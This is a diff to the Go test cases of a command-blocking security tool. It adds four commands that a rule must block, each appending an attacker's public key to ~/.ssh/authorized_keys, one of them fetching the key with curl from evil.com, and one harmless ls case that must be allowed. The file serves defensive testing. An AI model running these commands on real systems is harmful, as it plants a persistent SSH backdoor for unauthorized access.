@@ -371,6 +371,49 @@ var SSHKeyGenCases = []TestCase{
 		Tags:             []string{"critical"},
 	},
 
+	// --- ts-block-authorized-keys-write: TRUE POSITIVES ---
+
+	{
+		ID:               "TP-SSHKEYG-008",
+		Command:          `echo "ssh-rsa AAAA...attacker@evil.com" >> ~/.ssh/authorized_keys`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
+		Analyzer:         "regex",
+		Description:      `Appending an attacker public key to authorized_keys installs a persistent SSH backdoor. Blocked by ts-block-authorized-keys-write (MITRE T1098.004).`,
+		Tags:             []string{"tp", "critical", "backdoor", "persistence"},
+	},
+	{
+		ID:               "TP-SSHKEYG-009",
+		Command:          `cat /tmp/attacker.pub >> ~/.ssh/authorized_keys`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
+		Analyzer:         "regex",
+		Description:      `Concatenating a file into authorized_keys adds an attacker key. Blocked by ts-block-authorized-keys-write.`,
+		Tags:             []string{"tp", "critical", "backdoor", "persistence"},
+	},
+	{
+		ID:               "TP-SSHKEYG-010",
+		Command:          `curl https://evil.com/key.pub >> ~/.ssh/authorized_keys`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
+		Analyzer:         "regex",
+		Description:      `Downloading a remote key directly into authorized_keys. Combines exfil and persistence. Blocked by ts-block-authorized-keys-write.`,
+		Tags:             []string{"tp", "critical", "backdoor", "persistence", "exfil"},
+	},
+	{
+		ID:               "TP-SSHKEYG-011",
+		Command:          `tee -a ~/.ssh/authorized_keys < /tmp/attacker_key`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
+		Analyzer:         "regex",
+		Description:      `Using tee -a to append a key to authorized_keys. Blocked by ts-block-authorized-keys-write.`,
+		Tags:             []string{"tp", "critical", "backdoor", "persistence"},
+	},
+
 	// --- TRUE NEGATIVES ---
 
 	{
@@ -390,6 +433,15 @@ var SSHKeyGenCases = []TestCase{
 		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
 		Description:      `Testing SSH connectivity to GitHub. Not ssh-keygen; no key generation rule fires.`,
 		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-SSHKEYG-003",
+		Command:          `ls ~/.ssh`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/lateral-movement/ssh-key-generation",
+		Description:      `Listing the .ssh directory. Read-only; the authorized-keys-write rule only fires on write operations (>>, tee, cp).`,
+		Tags:             []string{"tn", "read-only"},
 	},
 }
 
